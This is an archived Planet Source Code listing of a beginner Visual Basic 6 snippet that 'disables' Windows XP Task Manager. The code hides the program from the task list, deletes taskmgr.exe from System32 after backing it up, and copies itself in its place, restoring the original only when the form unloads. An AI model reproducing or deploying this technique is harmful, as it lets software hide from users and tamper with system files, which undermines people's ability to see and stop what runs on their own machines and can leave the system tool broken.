<div align="center">

## Disable taskmanager \(XP\)


</div>

### Description

This code temporary disables the taskmanager, works with Windows XP Home ... please vote ...
 
### More Info
 
After inputing the code, compile this app... and when a user presses, Alt + CTRL + Del it will display the current application...


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Lee S\. Cook](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/lee-s-cook.md)
**Level**          |Beginner
**User Rating**    |2.6 (13 globes from 5 users)
**Compatibility**  |VB 6\.0
**Category**       |[Coding Standards](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/coding-standards__1-43.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/lee-s-cook-disable-taskmanager-xp__1-48768/archive/master.zip)





### Source Code

```
Private Sub Form_Load()
  ' Hides the application from the taskmanager
  TaskVisible = False
  ' Makes a backup directory for taskmgr.exe
  MkDir "C:\TASKMANAGER-BACKUP"
  ' Makes a backup of taskmgr.exe .
  FileCopy "C:\WINDOWS\System32\taskmgr.exe", "C:\TASKMANAGER-BACKUP\taskmgr1.exe"
  ' Deletes the taskmgr.exe file .
  Kill "C:\WINDOWS\System32\taskmgr.exe"
  ' Copies this application and temporary bypassses it for taskmgr.exe .
  FileCopy App.Path & "\project1.exe", "C:\WINDOWS\System32\taskmgr.exe"
End Sub
Private Sub Form_Unload(Cancel As Integer)
  ' Copies the original file back to the original location on form unload .
  FileCopy "C:\TASKMANAGER-BACKUP\taskmgr1.exe", "C:\WINDOWS\System32\taskmgr.exe"
   'Deletes the temporary file
  Kill "C:\TASKMANAGER-BACKUP\taskmgr1.exe"
  'Deletes the temporary backup folder
  RmDir ("C:\TASKMANAGER-BACKUP")
End Sub
```

